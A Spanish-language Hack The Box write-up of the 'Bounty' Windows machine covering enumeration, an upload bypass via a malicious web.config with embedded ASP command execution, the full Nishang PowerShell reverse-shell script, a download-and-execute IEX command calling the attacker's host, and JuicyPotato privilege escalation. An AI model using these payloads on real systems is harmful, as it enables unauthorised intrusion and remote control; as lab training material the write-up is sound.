___
# Bounty Machine (Hack The Box)

IP atacante: 10.10.17.214
IP víctima: 10.129.72.47

Comprobamos conectividad con la máquina

![[bounty_ping.png]]

TTL = 127 -> Máquina Windows

___
# RECONOCIMIENTO Y ENUMERACIÓN

Realizamos un escaneo con `nmap` para ver posibles puertos abiertos

![[bounty_nmap.png]]

[+] Puertos abiertos:
	-> 80 | http | Microsoft IIS httpd 7.5

Echamos un vistazo a la página web

![[bounty_80.png]]

Ya que no disponemos de más información, hacemos fuzzing para ver qué directorios están expuestos

![[bounty_ffuf.png]]

Encontramos uno llamado `uploadedFiles`, pero no podemos acceder a él ya que nos lanza un `403 Forbidden`.

Buscamos con otro diccionario llamado `common.txt`

![[bounty_fuzzing2.png]]

Encontramos un archivo llamado `transfer.aspx`, miramos el contenido

![[bounty_transferaspx.png]]

Intentamos subir una webshell `.aspx` para lograr RCE, pero no nos deja subir archivos dicha extensión.

Lo que sí admite es una extensión `.config`, por lo que podemos subir un archivo malicioso que ejecute código `aspx`

```config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c ping 10.10.17.214")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```

Probamos a enviar un ping a nuestra IP para ver si tenemos RCE, asi que interceptamos paquetes ICMP con `tshark`

![[bounty_tshark.png]]

Tenemos una respuesta positiva, asi que nos mandamos una consola por el puerto 443 que estará en escucha con netcat. Usaremos un script llamado ``Invoke-PowerShell.ps1``.

```ps1
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.214 -Port 443
```

La última línea es importante ya que se ejecutará directamente y enviará la consola. Ahora abrimos un servidor http con python.

![[bounty_serverpy.png]]

Editamos la siguiente línea en el `web.config` para que llame al archivo compartido por el servidor python.

```config
co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.17.214/PS.ps1')")
```

Volvemos a subir el archivo, nos dirigimos a su ruta y se nos enviará una powershell al puerto 443 como especificamos.

![[bounty_powershell.png]]

Obtenemos la flag del usuario `merlin`

![[bounty_flaguser.png]]

# ESCALA DE PRIVILEGIOS

Miramos qué permisos tiene otorgado el usuario actual

![[bounty_whoamipriv.png]]

Al ver SeImpersonatePrivilege, automáticamente tenemos que pensar en `JuicyPotato`

Nos descargamos Juicy Potato del siguiente enlace https://github.com/ohpe/juicy-potato/releases/tag/v0.1
y netcat de este https://eternallybored.org/misc/netcat/

Ahora nos movemos a C:\Windows\Temp\Privesc para obtener los archivos.

![[bounty_files.png]]

Ejecutamos el JuicyPotato para que ejecute netcat y nos envíe una consola por el puerto que le especifiquemos y tengamos en escucha.

![[bounty_jpnc.png]]

Finalmente, obtenemos la flag del root.

![[bounty_flagroot.png]]